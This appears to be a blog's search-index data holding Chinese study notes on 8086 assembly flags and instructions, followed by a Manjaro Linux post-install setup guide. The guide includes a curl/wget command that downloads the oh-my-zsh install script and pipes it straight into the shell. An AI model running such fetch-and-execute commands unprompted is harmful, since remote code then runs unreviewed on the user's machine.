位乘法，结果默认放在 ax 中；如果是 16 位，结果高位放在 dx，低位放在 ax。 解决除法溢出的方法： X/N = int( H/N)*65536 + [rem( H/N )*65536 + L ] / N X:被除数，N：除数，H：高 16 位，L：低 16 位，int：取商，rem：取余数 标志寄存器 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:13:3","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"ZF 标志（zero flag） flag 第 6 位是 ZF，零标志位。它记录执行相关指令后，其结果是否为 0。为 0 则 zf=1，否则 zf=0。 注意：8086 中，有些指令是影响 flag 的，比如：add、sub、mul、div、inc、or、and 等，它们大多是运算指令（逻辑或算数运算）；有一些则对 flag 没影响，如：mov，push，pop 等，大多是传送指令。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:14:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"PF 标志（Parity flag） flag 第 2 位是 PF，奇偶标志位。看执行结果的所有 bit 位中 1 的个数是否是偶数。是偶数则 pf=1，否则 pf=0。 可以理解成 1 偶标志位。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:15:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"SF 标志位（Sign Flag） flag 第 7 位是 SF，符号标志位。记录相关指令执行后结果是否为负。如果为负，sf=1；否则 sf=0 注意：sg 是 cpu 默认将数据当成有符号运算结果的记录。如果我们将数据当做无符号时，sf 时没有意义的，虽然相关指令可能影响了它的值。是不是有符号运算取决于我们。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:16:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"CF 标志位（Carry Flag） flag 第 0 位是 CF 标志位。一般情况下，在进行无符号数运算时，它记录了运算结果的最高有效位向更高位的进位值，或借位值。 inc 和 loop 指令不影响 cf ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:17:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"OF 标志位（Overflow Flag） flag 第 11 位是 OF，溢出标志位。记录了有符号运算的结果是否溢出。有溢出 of=1，否则 of=0； 注意和 CF 的区别： cf 是对无符号数运算有意义的标志位 of 是对有符号数运算有意义的标志位 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:18:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"adc 指令 adc 是带进位加法指令，它利用了 CF 位上记录的进位值。(add +carry –\u003e adc)如： adc ax,bx实现的功能是ax=ax+bx+cf。 cpu 提供 adc 的目的，就是来进行加法的第二步运算的。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:19:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"sbb 指令 sbb 是带借位减法指令（sub borrow），利用 cf 记录的借位值。 sbb ax,bx实现的功能是ax=ax-bx-cf。 cpu 提供 dbb 的目的，就是来进行减法的第二步运算的。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:20:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"cmp 指令 cmp 是比较指令，相当于减法指令，只是不保留结果。cmp 会对 flag 产生影响。如： cmp ax,ax做ax-ax运算，但并不在 ax 中保存，仅影响 flag。 进行·cmp ax,bx·比较后，通过 flag 可以看出比较结果 zf=1:ax=bx cf=1:ax\u003cbx cf=0:ax\u003e=bx cf=0 且 zf=0:ax\u003ebx cf=1 或 zf=1:ax\u003c=bx 注意：单纯的看 sf 的值不能判断结果的正负，因为可能会发生溢出。 而通过 sf 和 of 的值可以判断。 sf=1，of=0：没发生溢出，实际结果负，则逻辑结果也为负 sf=0，of=0：同上，逻辑结果非负 sf=1，of=1：有溢出，则实际与逻辑相反，逻辑为正。 sf=0，of=1：实际结果非负，又 of=1，则结果非 0，所以实际为正，逻辑结果为负。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:21:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"条件转移指令 通常配合 cmp，由 cmp 先进行比较，改变了 flag 中的值，条件转移指令根据 flag 中的值执行。 下面根据无符号数的比较进行转移的有： 指令 含义 条件 je 等于则转移 由 zf=1 则转移 jne 不等于则转移 zf=0 jb 低于则转移 cf=1 jnb 不低于则转移 cf=0 ja 高于则转移 cf=0 且 zf=0 jna 不高于则转移 cf=1 或 zf=1 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:22:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"DF 标志和串传送指令 flag 第 10 位是 DF，方向寄存器。在串处理指令中，控制每次操作后 si、di 的增减 df=0：每次操作后 si、di 递增 df=1：每次操作后 si、di 递减 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:23:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"movsb 指令 格式：movsb 相当于： mov es:[di],byte ptr ds:[si];（8086不支持这样的命令，这里只是描述） if df = 0: inc si inc di elif df = 1: dec si dec di ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:23:1","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"movsw 类似上面，就是 si,di 每次加或减 2 movsb和movsw进行的是串传送的一个步骤，通常配合rep使用,如： rep movsb，相当于： s:movsb loop s 可见rep是根据 cx 的值，重复执行后面的串传送指令。 cld 指令：可以将 df 置 0 std 指令：可以将 df 置 1 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:23:2","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"pushf 和 poopf pushf 功能是将标志寄存器的值压栈，popf 是从栈中弹出数据给标志寄存器中。 通过 pushf 和 popf，可以直接访问 flag call 和 ret 指令 call 和 ret 都是转移指令，都修改 IP，或同时修改 CS 和 IP。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:24:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"ret 和 retf ret 指令用栈中数据，修改 IP 的内容，从而实现近转移 retf 指令用栈中数据，修改 CS 和 IP 的内容，从而实现远转移 执行 ret 指令时，cpu 执行以下 2 部操作： ip=ss*10H+sp sp=sp+2 相当于pop ip 执行 retf 指令时，进行下面 4 部操作： ip=ss*10H+sp sp=sp+2 cs=ss*10H+sp sp=sp+2 相当于pop ip ;pop cs ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:24:1","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"call 指令 执行 call 指令时，进行 2 部操作： 将当前 ip 或 cs 和 ip 压栈 转移 call 不能实现短转移，除此之外，call 实现转移的方法和 jmp 相同: call 标号：将当前 ip 压栈后，转到标号处执行,相当于： push ip jmp near ptr 标号 call far ptr 标号：实现段间转移,相当于： push cs push ip jmp far ptr 标号 call 16位寄存器：相当于： push ip jmp 16位寄存器 call word ptr 内存单元地址,相当于： push ip jmp word ptr 内存单元地址 call dword ptr 内存单元地址,相当于： push cs push ip jmp dword ptr 内存单元地址 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:24:2","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"mul 指令 mul 是乘法指令，要注意以下两点： 两个相乘的数：要么都是 8 位，要么都是 16 位。如果是 8 位，一个放在 al，一个放在 8 位寄存器或内存字节单元中；若是 16 位，一个在 ax，一个在 16 位寄存器中。 结果：如果是 8 位乘法，结果默认放在 ax 中；如果是 16 位，结果高位放在 dx，低位放在 ax。 解决除法溢出的方法： X/N = int( H/N)*65536 + [rem( H/N )*65536 + L ] / N X:被除数，N：除数，H：高 16 位，L：低 16 位，int：取商，rem：取余数 标志寄存器 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:24:3","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"ZF 标志（zero flag） flag 第 6 位是 ZF，零标志位。它记录执行相关指令后，其结果是否为 0。为 0 则 zf=1，否则 zf=0。 注意：8086 中，有些指令是影响 flag 的，比如：add、sub、mul、div、inc、or、and 等，它们大多是运算指令（逻辑或算数运算）；有一些则对 flag 没影响，如：mov，push，pop 等，大多是传送指令。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:25:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"PF 标志（Parity flag） flag 第 2 位是 PF，奇偶标志位。看执行结果的所有 bit 位中 1 的个数是否是偶数。是偶数则 pf=1，否则 pf=0。 可以理解成 1 偶标志位。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:26:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"SF 标志位（Sign Flag） flag 第 7 位是 SF，符号标志位。记录相关指令执行后结果是否为负。如果为负，sf=1；否则 sf=0 注意：sg 是 cpu 默认将数据当成有符号运算结果的记录。如果我们将数据当做无符号时，sf 时没有意义的，虽然相关指令可能影响了它的值。是不是有符号运算取决于我们。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:27:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"CF 标志位（Carry Flag） flag 第 0 位是 CF 标志位。一般情况下，在进行无符号数运算时，它记录了运算结果的最高有效位向更高位的进位值，或借位值。 inc 和 loop 指令不影响 cf ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:28:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"OF 标志位（Overflow Flag） flag 第 11 位是 OF，溢出标志位。记录了有符号运算的结果是否溢出。有溢出 of=1，否则 of=0； 注意和 CF 的区别： cf 是对无符号数运算有意义的标志位 of 是对有符号数运算有意义的标志位 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:29:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"adc 指令 adc 是带进位加法指令，它利用了 CF 位上记录的进位值。(add +carry –\u003e adc)如： adc ax,bx实现的功能是ax=ax+bx+cf。 cpu 提供 adc 的目的，就是来进行加法的第二步运算的。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:30:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"sbb 指令 sbb 是带借位减法指令（sub borrow），利用 cf 记录的借位值。 sbb ax,bx实现的功能是ax=ax-bx-cf。 cpu 提供 dbb 的目的，就是来进行减法的第二步运算的。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:31:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"cmp 指令 cmp 是比较指令，相当于减法指令，只是不保留结果。cmp 会对 flag 产生影响。如： cmp ax,ax做ax-ax运算，但并不在 ax 中保存，仅影响 flag。 进行·cmp ax,bx·比较后，通过 flag 可以看出比较结果 zf=1:ax=bx cf=1:ax\u003cbx cf=0:ax\u003e=bx cf=0 且 zf=0:ax\u003ebx cf=1 或 zf=1:ax\u003c=bx 注意：单纯的看 sf 的值不能判断结果的正负，因为可能会发生溢出。 而通过 sf 和 of 的值可以判断。 sf=1，of=0：没发生溢出，实际结果负，则逻辑结果也为负 sf=0，of=0：同上，逻辑结果非负 sf=1，of=1：有溢出，则实际与逻辑相反，逻辑为正。 sf=0，of=1：实际结果非负，又 of=1，则结果非 0，所以实际为正，逻辑结果为负。 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:32:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"条件转移指令 通常配合 cmp，由 cmp 先进行比较，改变了 flag 中的值，条件转移指令根据 flag 中的值执行。 下面根据无符号数的比较进行转移的有： 指令 含义 条件 je 等于则转移 由 zf=1 则转移 jne 不等于则转移 zf=0 jb 低于则转移 cf=1 jnb 不低于则转移 cf=0 ja 高于则转移 cf=0 且 zf=0 jna 不高于则转移 cf=1 或 zf=1 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:33:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"DF 标志和串传送指令 flag 第 10 位是 DF，方向寄存器。在串处理指令中，控制每次操作后 si、di 的增减 df=0：每次操作后 si、di 递增 df=1：每次操作后 si、di 递减 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:34:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"movsb 指令 格式：movsb 相当于： mov es:[di],byte ptr ds:[si];（8086不支持这样的命令，这里只是描述） if df = 0: inc si inc di elif df = 1: dec si dec di ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:34:1","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"movsw 类似上面，就是 si,di 每次加或减 2 movsb和movsw进行的是串传送的一个步骤，通常配合rep使用,如： rep movsb，相当于： s:movsb loop s 可见rep是根据 cx 的值，重复执行后面的串传送指令。 cld 指令：可以将 df 置 0 std 指令：可以将 df 置 1 ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:34:2","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["汇编"],"content":"pushf 和 poopf pushf 功能是将标志寄存器的值压栈，popf 是从栈中弹出数据给标志寄存器中。 通过 pushf 和 popf，可以直接访问 flag ","date":"2019-12-25","objectID":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:35:0","tags":["汇编"],"title":"汇编学习笔记","uri":"/2019/12/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"修改源 sudo pacman-mirrors -i -c China -m rank ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:1:0","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"设置 archlinuxcn 源。 修改 /etc/pacman.conf 最后增加 [archlinuxcn] Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch #Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:1:1","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"更新系统，安装 archlinuxcn-keyring: sudo pacman -Syu sudo pacman -S archlinuxcn-keyring sudo pacman -Syu ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:2:0","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"修改 Home 下的目录为英文： 修改目录映射文件名； gedit ~/.config/user-dirs.dirs 修改为以下内容： XDG_DESKTOP_DIR=\"$HOME/Desktop\" XDG_DOWNLOAD_DIR=\"$HOME/Downloads\" XDG_TEMPLATES_DIR=\"$HOME/Templates\" XDG_PUBLICSHARE_DIR=\"$HOME/Public\" XDG_DOCUMENTS_DIR=\"$HOME/Documents\" XDG_MUSIC_DIR=\"$HOME/Music\" XDG_PICTURES_DIR=\"$HOME/Pictures\" XDG_VIDEOS_DIR=\"$HOME/Videos\" 将 Home 目录下的中文目录名改为对应的中文名； cd ~ mv 公共 Public mv 模板 Templates mv 视频 Videos mv 图片 Pictures mv 文档 Documents mv 下载 Downloads mv 音乐 Music mv 桌面 Desktop ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:3:0","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"安装常用软件 ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:4:0","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"yay sudo pacman -S yay ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:4:1","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"JetBrains Mono 字体 yay -S ttf-jetbrains-mono fc-cache -fv #刷新字体。 ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:4:2","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"vscode yay -S visual-studio-code-bin ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:4:3","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"gnome-keyring(用 vscode 自带的同步在 kde 环境下需要下载这个，不然报错：The name org.freedesktop.secrets was not provided by any .service files) yay -S gnome-keyring #密码设置为空，不然一打开vscode就会要你输入密码 #如果已经输入了密码，可以下载seahorse,再修改密码为空 ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:4:4","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"chome yay -S google-chrome ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:4:5","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"设置 chrome 为默认浏览器: 在设置里面设置默认浏览器为 chrome，再把 html 关联类型设置为用 chrome 打开 ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:4:6","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"oh-my-zsh #via curl sh -c \"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" #或者 via wget #sh -c \"$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\" git clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/plugins/zsh-autosuggestions git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/plugins/zsh-syntax-highlighting git clone https://github.com/lukechilds/zsh-nvm ~/.oh-my-zsh/custom/plugins/zsh-nvm #git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/plugins/zsh-syntax-highlighting #sudo pacman -S autojump 设置~/.zshrc ZSH_THEME=\"agnoster\" #export NVM_LAZY_LOAD=true plugins=( git zsh-syntax-highlighting zsh-autosuggestions zsh-nvm #autojump ) export NVM_LAZY_LOAD=true export NVM_COMPLETION=true 最后刷新 source ~/.zshrc ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:4:7","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"输入法 fcitx5 yay -S fcitx5-im fcitx5-chinese-addons echo \"INPUT_METHOD DEFAULT=fcitx5\" \u003e ~/.pam_environment echo \"GTK_IM_MODULE DEFAULT=fcitx5\" \u003e\u003e ~/.pam_environment echo \"QT_IM_MODULE DEFAULT=fcitx5\" \u003e\u003e ~/.pam_environment echo \"XMODIFIERS DEFAULT=\\@im=fcitx5\" \u003e\u003e ~/.pam_environment cp /usr/share/applications/fcitx5.desktop ~/.config/autostart/ #自启动 ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:4:8","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"v2ray yay -S v2ray qv2ray ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:4:9","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"idea yay -S intellij-idea-ultimate-edition ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:4:10","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"rustup yay -S rustup rustup install stable ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:5:0","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"qq/tim yay -S deepin.com.qq.office #tim yay -S deepin.com.qq.im #qq #如果打不开，安装gnome-settings-daemon #yay -S gnome-settings-daemon #再设置/usr/lib/gsd-xsettings为自启动 #系统设置-\u003e开机或关机-\u003e自动启动-\u003e添加脚本-\u003e输入`/usr/lib/gsd-xsettings` #重启 ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:6:0","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"Jdk yay -S jdk #查看jdk状态 archlinux-java status #设置默认jdk #sudo archlinux-java set java-14-jdk ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:7:0","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"网易云音乐 yay -S iease-music ","date":"2019-01-10","objectID":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/:7:1","tags":["Manjaro"],"title":"Manjaro安装后配置","uri":"/2019/01/manjaro%E5%AE%89%E8%A3%85%E5%90%8E%E9%85%8D%E7%BD%AE/"},{"categories":null,"content":"美化 sudo pacman -S papirus-icon-theme sudo pacman 